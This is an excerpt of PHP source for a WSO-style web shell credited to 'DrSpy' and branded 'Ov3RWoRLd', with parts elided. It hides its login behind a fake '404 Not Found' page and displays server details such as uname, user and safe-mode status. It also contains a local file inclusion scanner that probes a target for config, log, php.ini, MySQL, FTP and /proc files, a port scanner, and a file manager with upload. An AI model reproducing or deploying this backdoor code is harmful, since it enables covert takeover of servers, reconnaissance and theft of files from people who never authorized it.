...
/*Maded by DrSpy*/
$auth_pass = "4b18f52a1e17e40aca9eaa64dee0491c";
$color = "#00FFFF";
//$color = "#0000CD";
...
function wsoLogin() {
    die("<title>404 Error - Page Not Found</title>
	<h1>Not Found</h1>
...
function wsoHeader() {
    ...
    global $color;
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - Ov3RWoRLd</title>
<style>
::-webkit-scrollbar {
height: 0px;
width: 14px;
...
::-webkit-scrollbar-thumb:vertical {    background-color:#202020  ;} 
...
input, textarea, select{ margin:0;color:white;background-color:#000;border:1px solid $color; font: 9pt Monospace,'Courier New'; }  
form{ margin:0px; }  
...
<input type=hidden name=charset>
    ...
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' </nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=green>ON</font>':'<font color=red><b>OFF</b></font>')
   ...
   error_reporting(0);
      if($_POST['lfiurl']) {
         ...
         if ( $type == 1 ) {
            ...
            $rhash2 = md5($res2);
            if ($rhash1 != $rhash2) {
                print "<font color='#00FFFF'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
            while($lfiaccess[$x]) {
                $res3 = FetchURL($target.$lfiaccess[$x]);
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfiaccess[$x]."\">".$target."".$lfiaccess[$x]."</a><br  />";
                }
                else {              
         ...
         if ( $type == 2 ) {
            ...
            while($lficonfig[$x]) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lficonfig[$x]."\">".$target."".$lficonfig[$x]."</a><br  />";
                }
                else {              
         ...
         if ( $type == 3 ) {
            ...
            while($lfierror[$x]) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfierror[$x]."\">".$target."".$lfierror[$x]."</a><br  />";
                }
                else {              
         ...
         if ( $type == 4 ) {
            ...
            while($lfiphpini[$x]) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfiphpini[$x]."\">".$target."".$lfiphpini[$x]."</a><br  />";
                }
                else {              
         ...
         if ( $type == 5 ) {
            ...
            while($lfimysql[$x]) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfimysql[$x]."\">".$target."".$lfimysql[$x]."</a><br  />";
                }
                else {              
         ...
         if ( $type == 6 ) {
            ...
            while($lfiftp[$x]) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfiftp[$x]."\">".$target."".$lfiftp[$x]."</a><br  />";
                }
                else {              
...
if ( $type == 7 ) {
            ...
            if ($rhash1 != $rhash2) {
                ...
                $rhash3 = md5($res3);
                if ($rhash3 != $rhash2) {
                print "<font color='#00FFFF'>[+] File detected!</font> <a href=\"".$target."".$lfiprocenv."\">".$target."".$lfiprocenv."</a><br  />";
                }
                else {              
...
for($i = $start; $i<=$end; $i++){
    ...
    if($fp){
        echo 'Port '.$i.' is <font color=#00FFFF>open</font><br>';
    }
    flush();
    }
}else{
...
function actionFilesMan() {
    wsoHeader();
    echo '<h1>File manager by Ov3RWoRLd</h1><div class=content><script>p1_=p2_=p3_="";</script>';
    if(!empty($_POST['p1'])) {
        switch($_POST['p1']) {
            case 'uploadFile':
...
function actionFilesTools() {
    ...
    wsoHeader();
    echo '<h1>File tools by Ov3RWoRLd</h1><div class=content>';
    if( !file_exists(@$_POST['p1']) ) {
